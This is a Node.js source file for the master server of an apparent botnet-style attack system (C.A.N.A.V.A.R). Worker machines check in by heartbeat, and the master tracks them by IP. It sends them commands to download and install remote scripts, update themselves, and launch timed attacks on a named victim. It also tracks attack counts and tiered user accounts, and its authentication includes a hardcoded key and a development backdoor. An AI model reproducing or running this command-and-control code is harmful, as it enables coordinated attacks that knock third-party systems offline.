//npm install express json-server axios events delay random-number-csprng moment crypto dotenv
process.on('uncaughtException', function (err) {
    console.log(err);
});
process.chdir(__dirname)
const dotenv_ = require('dotenv')
const dotenv = dotenv_.config().parsed
const { exec } = require('child_process');
let initSign = `${Date.now()}`
const logger = require('./logger.js').log
logger.init(initSign, "Initiating...")
const express = require('express')
logger.init(initSign, "Called 'express'")
const app = express()
logger.init(initSign, "Initiated 'express'")
const jsonServer = require('json-server')
logger.init(initSign, "Called 'json-server'")
const jServer = jsonServer.create()
logger.init(initSign, "Created 'json-server'")
const router = jsonServer.router('db.json')
logger.init(initSign, "Called 'json-server' router")
const middlewares = jsonServer.defaults()
const axios = require('axios').default;
logger.init(initSign, "Called 'axios'")
const EventEmitter = require('events')
logger.init(initSign, "Called 'events'")
const delay = require('delay')
logger.init(initSign, "Called 'delay'")
const moment = require('moment')
logger.init(initSign, "Called 'moment'")
const crypto = require('crypto')
logger.init(initSign, "Called 'crypto'")
logger.init(initSign, "Called 'caller-id'")
const bodyParser = require('body-parser');
const si = require('systeminformation');
const jwt = require('jsonwebtoken');

let config = {
    pk: [
        "foobar"
    ],
    log: null,
    dumpTimerDelay: null,
    domainConnection: null
}

let systemInfo = {
    static: null,
    dynamic: {
        cpu: {
            brand: null,
            speed: null,
            voltage: null
        },
        mem: {
            total: null,
            free: null,
            used: null,
            active: null,
            available: null
        },
        load: null,
        net: null
    }
}

let Globals = {
    restart: {
        scheduled: false,
        at: null,
        last: null
    },
    lockdown: true,
    allDynamicData: null,
    staticData: null,
    simpleHeartbeatDelay: null,
    complexHeartbeatDelay: null,
    refreshTimerDelay: null,
    siDataPlacementDelay: null,
    dynDataPlacementDelay: null,
    maximumPortLife: null
}

/* let database = {
    globals: "http://localhost:3000/global/",
    setup: "http://localhost:3000/setup/",
    scripts: "http://localhost:3000/scripts/",
    machines: "http://localhost:3000/machines/",
    settings: "http://localhost:3000/settings/",
    stats: "http://localhost:3000/stats/",
    users: "http://localhost:3000/users/",
} */

let slaveInfo = {
    scripts: null,
    setup: null
}

let stats = {

}

let users = {
    all: [],
    get: function (uid) {
        return users.all.find(u => { return (u.id === uid) })
    },
    has: function (uid) { //repetitive.repetitive.repetitive.repetitive.repetitive.
        let u = users.all.find(u => { return (u.id === uid) });
        if (u !== undefined) {
            return true
        } else {
            return false
        }
    },
    update: function (uid, area, data) {
        users.all.find(u => { if (u.id === uid) { u[area] = data } })
    },
    count: function () { return users.all.length }
}

let databaseAddress = "http://localhost:3000/";

let database = { // switch to new databaseElement() or sth fancy in the future?
    globals: {
        fetch: async function () {
            return axios.get(database.globals.address, { timeout: 4000 })
                .then(res => {
                    Globals = res.data
                    console.log(Globals);
                })
                .catch(err => {
                    database.globals.fetch()
                })
        },
        dump: async function () {
            return axios.patch(database.globals.address, Globals)
                .then(res => {
                    Globals.latestGlobalsDump = Date.now()
                    console.log("Globals dumped.");
                })
                .catch(err => {
                    console.error(err);
                })
        },
        address: databaseAddress + "global/",
    },
    config: {
        fetch: async function () {
            return axios.get(database.config.address)
                .then(resx => {
                    config = resx.data
                })
                .catch(err => {
                    database.config.fetch()
                })
        },
        address: databaseAddress + "settings/"
    },
    slaveSetup: {
        fetch: async function () {
            return axios.get(database.slaveSetup.address)
                .then(res => {
                    slaveInfo.setup = res.data
                    for (const key in slaveInfo.setup) {
                        let k = key
                        let aa = (stitchSetupLines(k, (slaveInfo.setup)))
                        if (aa) {
                            ((slaveInfo.setup)[k]) = aa
                        }
                    }
                    console.log("Setups loaded.");
                })
                .catch(err => {
                    console.error(err);
                })
        },
        address: databaseAddress + "setup/"
    },
    scripts: {
        fetch: async function () {
            return axios.get(database.scripts.address)
                .then(res => {
                    slaveInfo.scripts = res.data
                    console.log("Scripts loaded.");
                })
                .catch(err => {
                    console.error(err);
                })
        },
        address: databaseAddress + "scripts/"
    },
    stats: {
        fetch: async function () {
            return axios.get(database.stats.address)
                .then(res => {
                    stats = res.data
                    stats.userCount = users.count()
                    console.log(users.count());
                    console.log("Stats loaded.");
                })
                .catch(err => {
                    console.error(err);
                })
        },
        dump: async function () {
            return axios.patch(database.stats.address, stats)
                .then(res => {
                    console.log("Stats dumped.");
                })
                .catch(err => {
                    console.error(err);
                })
        },
        address: databaseAddress + "stats/"
    },
    users: {
        fetch: async function () {
            return axios.get(database.users.address)
                .then(res => {
                    users.all = res.data.all
                    console.log("Users loaded.");
                    console.log(users);
                })
                .catch(err => {
                    console.error(err);
                })
        },
        dump: async function () {
            return axios.patch(database.users.address, {all: users.all})
                .then(res => {
                    console.log("Users dumped.");
                })
                .catch(err => {
                    console.error(err);
                })
        },
        address: databaseAddress + "users/"
    },
    machines: {
        address: databaseAddress + "machines/"
    }
}

console.log(database.globals.address);

let Machines = {
    all: {

    },
    has: function (mid) {
        if (Machines.all[mid]) {
            return true
        }
    },
    get: function (mid) {
        if (Machines.all[mid]) {
            return Machines.all[mid]
        } else {
            return { null: null }
        }
    },
    clean: function () {
        Machines.all = {}
    },
    count: function () {
        return (Object.keys(Machines.all)).length
    },
    list: function () {
        let macar = []
        for (const key in Machines.all) {
            macar.push(Machines.all[key])
        }
        return macar
    }
}

si.getDynamicData(function (data) {
    systemInfo.dynamic.all = data
})

let initiated = false
let dumpTimer = null
const databaseInitiated = new EventEmitter()

function logID() {
    return crypto.randomBytes(5).toString('hex');
}

jServer.use((req, res, next) => {
    if (req.hostname === "localhost") {
        next()
    } else {
        if (req.method === "POST") {
            if ((req.headers.accesskey)) {
                if ((config.pk).includes(req.headers.accesskey)) {
                    //console.log("approve");
                    next()
                } else {
                    res.send(403)
                }
            } else {
                res.send(403)
            }
        } else {
            next();
        }
    }

})

app.use(require('cors')())

app.use((req, res, next) => {
    if (initiated) {
        let area = ((req.originalUrl).split("/")[1]);
        if (area === "mgmt") {
            if ((req.headers.accesskey)) {
                if ((config.pk).includes(req.headers.accesskey)) {
                    //console.log("approve");
                    next()
                } else {
                    res.send(403)
                }
            } else {
                res.send(403)
            }
        } else {
            next()
        }
    }
    else {
        res.send(500, {
            error: {
                message: "MASTER_IS_INITIATING",
                innerResponse: `The master had started at ${initSign}`
            }
        })
    }
})

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(bodyParser.raw());

jServer.use(middlewares)
jServer.use(router)

jServer.listen(3000, () => { console.log("dbok"); databaseInitiated.emit('true') })

databaseInitiated.on('true', async () => {
    console.log("Begin init.");
    await database.globals.fetch()
    await database.config.fetch()
    await database.users.fetch()
    await database.slaveSetup.fetch()
    await database.scripts.fetch()
    await database.stats.fetch()
    updateMasterSubdomain()
    await dbMachineCleanup()
    initiated = true

    let dumpLoop = function () {
        database.globals.dump()
        database.stats.dump()
        database.users.dump()
        dumpTimer = setTimeout(dumpLoop, config.dumpTimerDelay);
    }

    dumpLoop()

    console.log("End init.");
})



async function dbMachineCleanup() {
    return axios.get(database.machines.address)
        .then(async (res) => {
            let machines = res.data
            async function delall() {
                for (let index = 0; index < machines.length; index++) {
                    const element = machines[index];
                    await axios.delete(`${database.machines.address}${element.id}`)
                        .then(res => {
                            //console.log(res)
                        })
                        .catch(err => {
                            console.error(err);
                        })
                }
            }
            await delall()
            return
        })
        .catch(err => {
            console.error(err);
        })
}


async function dumpGlobals() {
    return axios.patch(database.globals.address, Globals)
        .then(res => {
            Globals.latestGlobalsDump = Date.now()
            console.log("Globals dumped.");
        })
        .catch(err => {
            console.error(err);
        })
}

async function dumpStats() {
    return axios.patch(database.stats.address, stats)
        .then(res => {
            console.log("Stats dumped.");
        })
        .catch(err => {
            console.error(err);
        })
}

function updateMasterSubdomain() {
    let traceid = logID()
    if (config.domainConnection) {
        logger.info(traceid, "Updating Master Subdomain", `Begun`)
        axios.get("http://icanhazip.com")
            .then(res => {
                let currentIP = res.data
                logger.info(traceid, "Updating Master Subdomain", `Current IP recieved as ${currentIP}`)
                var options = {
                    method: 'PUT',
                    url: `https://api.cloudflare.com/client/v4/zones/${dotenv.CFZI}/dns_records/${dotenv.CFDR}`,
                    headers: { Authorization: 'Bearer ' + dotenv.CFPT, 'Content-Type': 'application/json' },
                    data: { type: 'A', name: 'master.api.canavar.licentia.xyz', content: currentIP, ttl: 1, proxied: true }
                };
                axios.request(options).then(function (response) {
                    logger.info(traceid, "Updated Master Subdomain", `Updated the subdomain to IP ${currentIP}`)
                }).catch(function (error) {
                    logger.info(traceid, "Couldn't Update Master Subdomain", `Tried to update the subdomain to IP ${currentIP}`)
                    console.error(error);
                });
            })
            .catch(err => {
                console.error(err);
                logger.info(traceid, "Couldn't Update Master Subdomain", `Error was : ${err}`)
            })
    } else {
        logger.info(traceid, "Updating Master Subdomain", `Aborted because config prevents automatic subdomain heartbeats.`)
    }
}

app.get('/', (req, res) => {
    let ref = (req.headers.host);
    if (ref === "127.0.0.1") {

    }
    res.send(200, "OKAY")
})

app.get('/scripts', (req, res) => {
    let scid = ([Object.keys(req.query)[0]][0]);
    let detid = ([Object.keys(req.query)[1]][0]);
    //console.log(scid);
    if (scid === undefined) {
        res.send(200, slaveInfo.scripts)
    } else {
        let allScripts = slaveInfo.scripts
        for (let index = 0; index < allScripts.length; index++) {
            let cScript = allScripts[index];
            if (cScript.id === scid) {
                if (detid === "download") {
                    res.send(200, `cd ${slaveInfo.setup.scriptdir}; wget ${cScript.source} -O ${cScript.filename}`)
                } else {
                    res.send(cScript)
                }
                return
            }
        }
        res.send(500, {
            error: {
                message: "SCRIPT_DOES_NOT_EXIST",
                innerResponse: `SCRIPT_DOES_NOT_EXIST`
            }
        })
    }
})

app.get('/setup', (req, res) => {
    let scid = ([Object.keys(req.query)[0]][0]);
    let detid = ([Object.keys(req.query)[1]][0]);
    //console.log(scid, detid);
    if (!((Object.keys(slaveInfo.setup)).includes(scid))) {
        res.send(200, slaveInfo.setup)
    } else {
        let setup_ = slaveInfo.setup
        if (setup_[scid]) {
            res.send(200, setup_[scid])
        }
    }
})

function stitchSetupLines(asked, setup_) {
    if (setup_[asked]) {
        if ((setup_[asked]).includes("[")) {
            let a = setup_[asked]
            let b = (a.split("["));
            for (let c = 0; c < b.length; c++) {
                let d = b[c];
                d = d.split("]")[0]
                if (setup_[d]) {
                    b[c] = setup_[d]
                }
            }
            let e = b.join("")
            return e
        } else {
            return (setup_[asked])
        }
    } else {
        return null
    }
}

app.get('/globals', (req, res) => {
    res.send(200, Globals)
})

app.get('/stats', (req, res) => {
    res.send(200, stats)
})

app.post('/heartbeat', (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    ip = ip.toString().replace('::ffff:', '');
    let machine = req.body.machine
    Machines.all[ip] = {
        id: ip,
        machine
    }
    res.send(200, Globals)
})

app.patch('/heartbeat', (req, res) => {
    let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
    ip = ip.toString().replace('::ffff:', '');
    let machine = req.body.machine
    if (Machines.all[ip]) {
        Machines.all[ip].machine.port = machine.port
        Machines.all[ip].machine.busy = machine.busy
        Machines.all[ip].machine.init = machine.init
        Machines.all[ip].machine.currentAttack = machine.currentAttack
    } else {
        Machines.all[ip] = {
            id: ip,
            machine
        }
    }
    res.send(200, Globals)
})

app.get('/all/installscript/:scriptid', async (req, res) => {
    //axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/installScript/${req.params.scriptid}`)
    let machines = {
        all: Machines.list(),
        asked: [],
        responded: [],
        busy: []
    }
    for (let index = 0; index < (machines.all).length; index++) {
        let currentMachine = ((machines.all)[index])
        machines.asked.push(currentMachine)
        axios.get(`http://${currentMachine.id}:${currentMachine.machine.port.number}/installScript/${req.params.scriptid}`)
            .then(res => {
                machines.responded.push(currentMachine)
            })
            .catch(err => {
                console.error(err.response.data);
                machines.busy.push(currentMachine)
            })
    }
    await delay(3000)
    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
})
app.get('/all/npminstall/:module', async (req, res) => {
    //axios.get(`http://${activeMachinesList[index]}:${Globals.port.number}/npminstall/${req.params.module}`)
    let machines = {
        all: Machines.list(),
        asked: [],
        responded: [],
        busy: []
    }
    for (let index = 0; index < (machines.all).length; index++) {
        let currentMachine = ((machines.all)[index])
        machines.asked.push(currentMachine)
        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port.number}/npminstall/${req.params.module}`)
            .then(res => {
                machines.responded.push(currentMachine)
            })
            .catch(err => {
                console.error(err.response.data);
                machines.busy.push(currentMachine)
            })
    }
    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
})

app.get('/all/attack/:methodID/:victim/:time/:attackID', async (req, res) => {
    stats.totalAttacks = stats.totalAttacks + 1
    let machines = {
        all: Machines.list(),
        asked: [],
        responded: [],
        busy: []
    }
    for (let index = 0; index < (machines.all).length; index++) {
        let currentMachine = ((machines.all)[index])
        machines.asked.push(currentMachine)
        console.log(currentMachine);
        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port.number}/attack/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
            .then(res => {
                machines.responded.push(currentMachine)
            })
            .catch(err => {
                console.error(err.response.data);
                machines.busy.push(currentMachine)
            })
    }
    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
})

app.get('/all/update', async (req, res) => {
    let machines = {
        all: Machines.list(),
        asked: [],
        responded: [],
        busy: []
    }
    for (let index = 0; index < (machines.all).length; index++) {
        let currentMachine = ((machines.all)[index])
        machines.asked.push(currentMachine)
        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port.number}/update`)
            .then(res => {
                machines.responded.push(currentMachine)
            })
            .catch(err => {
                console.error(err.response.data);
                machines.busy.push(currentMachine)
            })
    }
    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
})

app.get('/machines/', (req, res) => {
    res.send(200, Machines.all)
})
app.get('/machines/list', (req, res) => {
    let macar = []
    for (const key in Machines.all) { macar.push(Machines.all[key]) }
    res.send(200, macar)
})
app.get('/machines/count', (req, res) => {
    res.send(200, Machines.count())
})
app.get('/machines/:machid', (req, res) => {
    res.send(200, Machines.get(req.params.machid))
})
app.get('/machines/testReachability/', async (req, res) => {
    let machines = {
        all: Machines.list(),
        asked: [],
        responded: [],
        busy: []
    }
    for (let index = 0; index < (machines.all).length; index++) {
        let currentMachine = ((machines.all)[index])
        machines.asked.push(currentMachine)
        await axios.get(`http://${currentMachine.id}:${currentMachine.machine.port.number}/status`)
            .then(res => {
                machines.responded.push(currentMachine)
            })
            .catch(err => {
                console.error(err.response.data);
                machines.busy.push(currentMachine)
            })
    }
    res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
})

app.post('/mgmt/database', async (req, res) => {
    res.sendFile(__dirname + '/db.json');
})

app.get('/mgmt/users', async (req, res) => {
    res.send(200, users.all)
})



app.get('/mgmt/systemInfo', async (req, res) => {
    let systemInfo_ = systemInfo
    si.mem(function (memdata) {
        systemInfo_.dynamic.mem.total = memdata.total
        systemInfo_.dynamic.mem.free = memdata.free
        systemInfo_.dynamic.mem.used = memdata.used
        systemInfo_.dynamic.mem.active = memdata.active
        systemInfo_.dynamic.mem.available = memdata.available
        si.cpu(function (cpudata) {
            systemInfo_.dynamic.cpu.voltage = cpudata.voltage
            systemInfo_.dynamic.cpu.speed = cpudata.speed
            systemInfo_.dynamic.cpu.brand = cpudata.brand
            si.currentLoad(function (data) {
                systemInfo_.dynamic.load = data
                si.networkStats(function (data) {
                    systemInfo_.dynamic.net = data
                    res.send(200, systemInfo_)
                })
            })
        })
    })
})

app.post('/mgmt/update', (req, res) => {
    res.send(200)
    exec("cd /C.A.N.A.V.A.R/ ; git stash; git stash drop; git pull; cd master ; npm install;", (err, stdout, stderr) => {
        if (err) {
            //some err occurred
            console.error(err)
            res.send(500, { std_err: err })
        } else {
            // the *entire* stdout and stderr (buffered)

            res.send(200, { std_out: stdout, std_err: stderr })
        }
    })
})

app.post('/mgmt/vcontrol', (req, res) => {
    exec("cd /C.A.N.A.V.A.R/ ; git show -1 --stat  ", (err, stdout, stderr) => {
        if (err) {
            //some err occurred
            console.error(err)
            res.send(200, { std_err: err })
        } else {
            // the *entire* stdout and stderr (buffered)
            let stdout_ = stdout
            if (stdout.length > 10) {
                var options = {
                    method: 'GET',
                    url: 'https://api.github.com/repos/mehmetefeerkan/C.A.N.A.V.A.R/commits',
                    headers: { Accept: 'application/vnd.github.v3+json' }
                };

                axios.request(options).then(function (response) {
                    let resp = response.data
                    let latestCommitSHA = resp[0].sha
                    if ((latestCommitSHA === (null || undefined || ""))) {
                        res.send(500, {
                            error: {
                                message: "INVALID_COMMIT_SHA_RECIEVED",
                                innerResponse: `Given SHA was${latestCommitSHA}`
                            }
                        })
                    } else {
                        if (stdout_.includes(latestCommitSHA)) {
                            res.send(200, { upToDate: true, latestCommit: resp[0], currentCommitData: stdout_ })
                        } else {
                            res.send(200, { upToDate: false, latestCommit: resp[0], currentCommitData: stdout_ })
                        }
                    }
                }).catch(function (error) {
                    console.error(error);
                });
            }
            //res.send(200, {std_out: stdout, std_err: stderr})x
        }
    })
})

app.post('/auth/register', (req, res) => { //collect all auht / mgmt / all / api endpoints to other route files maybe some time?
    if (req.body) {
        let userId = req.body.userId
        let passHash = req.body.passHash
        let fingerprint = req.body.fingerprint || null
        let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
        ip = ip.toString().replace('::ffff:', '');
        if (users.has(userId)) {
            res.send(500, {
                error: {
                    message: "USER_ALREADY_EXISTS",
                    innerResponse: `This user already exists in the database...`
                }
            })
        } else {
            let userSeshExpiry = moment().add({ milliseconds: config.userSessionExpiryInterval }).unix() * 1000
            let user = {
                id: userId,
                hash: passHash,
                admin: false,
                tier: 0,
                op: false,
                ip: ip,
                lastLogin: Date.now(),
                lastRequest: Date.now(),
                fingerprint: fingerprint, //TODO
                differentFingerprints: 0, //TODO
                differentIps: 0, //TODO
                passwordViolations: 0, //TODO
                lastAuthenticatedAction: null,
                eat: userSeshExpiry
            }
            const seshToken = jwt.sign(user, config.jwtSecret)
            user.session = seshToken
            console.log(user);
            users.all.push(user)
            axios.post(database.users.address, user)
                .then(resp => {
                    res.json({ seshToken })
                })
                .catch(err => {
                    console.error(err);
                })
        }
    } else {
        res.send(405)
    }
})

app.post('/auth/login', (req, res) => { // TODO: collect all auth / mgmt / all / api endpoints to other independent route files maybe some time?
    if (req.body) {
        let userId = req.body.userId
        let passHash = req.body.passHash
        console.log(users.has(userId)); //TODO: lightweightize checks and controls here, and make this thing FUCKING shorter. 
        if (users.has(userId)) { //if user exists
            let currentUser = users.get(userId)
            if (currentUser.hash === passHash) { //AND if password matches
                if (currentUser.session !== null) { //if there is a session provided
                    let seshToken = currentUser.session
                    jwt.verify(seshToken, config.jwtSecret, (err, user) => {
                        if (err) {
                            users.update(userId, "session", null)
                            res.send(401, {
                                error: {
                                    message: "INVALID_TOKEN",
                                    innerResponse: "Given token for the user was incorrect."
                                }
                            })
                        } else {
                            console.log(currentUser, user);
                            res.send(200, { user: user, token: seshToken })
                        }
                    });
                } else { //session is expired, refresh the token.
                    let userSeshExpiry = moment().add({ milliseconds: config.userSessionExpiryInterval }).unix() * 1000
                    currentUser.eat = userSeshExpiry
                    const seshToken = jwt.sign(currentUser, config.jwtSecret)
                    currentUser.session = seshToken
                    users.update(userId, "session", seshToken)
                    users.update(userId, "eat", userSeshExpiry)
                    console.log(currentUser);
                    res.send(200, { user: currentUser })
                }
            } else {
                res.send(401, {
                    error: {
                        message: "INVALID_CREDENTIALS",
                        innerResponse: "Given password for the user was incorrect."
                    }
                })
            }
        } else {
            res.send(500, {
                error: {
                    message: "USER_DOESNT_EXIST",
                    innerResponse: `A user with this username doesn't exist.`
                }
            })
        }
    } else {
        res.send(405)
    }
})

const authenticate = (req, res, next) => {
    let authKey = req.headers["authorization"]
    console.log(authKey);
    if (authKey) {
        if (authKey === config.jwtSecret) { 
            req.userData = {
                id: "dev",
                hash: "dev",
                admin: true,
                tier: 3,
                op: true
            }
            next(); return 
        } //for development
        jwt.verify(authKey, config.jwtSecret, (err, user) => {
            if (err) {
                res.send(401, {
                    error: {
                        message: "INVALID_TOKEN",
                        innerResponse: "Given token for the user was incorrect."
                    }
                })
            }
            if (user) {
                users.update(user.id, "lastRequest", Date.now())
                if (user.tier <= 0) {
                    res.send(401, {
                        error: "INSUFFICIENT_PRIVILEGES",
                        innerResponse: "This user is not permitted to use any services. Please contact the administrator."
                    })
                } else {
                    users.update(user.id, "lastAuthenticatedAction", `${Date.now()}`)
                    req.userData = user
                    next()
                }
            }
        });
    } else {
        res.send(401, "FUCK OFF")
    }
}

app.get('/auth/test', authenticate, (req, res) => {
    console.log(req.userData);
    res.send('hello from simple server :)')
    //ToDo: get all auth logic ready for prod. and minify it as much as you can.
    //ToDo: create a function, possibly promise-based, in order to refresh user tokens.
    //ToDo: first, move from array-based user data storage to object-based storage. arrays with user data are unbearable.
    //ToDo: if ^ that doesn't work, move to fucking mongoose (please, god, please make this ^ work...)
    //ToDo: make admins and OP's invul to /mgmt/ routes.
    //ToDo: Integrate tier-checking abilities.
    //ToDo: Dumping users when neccessary has to be timer'ed :D
    //ToDo: put user count to stats
})


app.listen(80, () => console.log(`App listening on port ${"80"}!`))


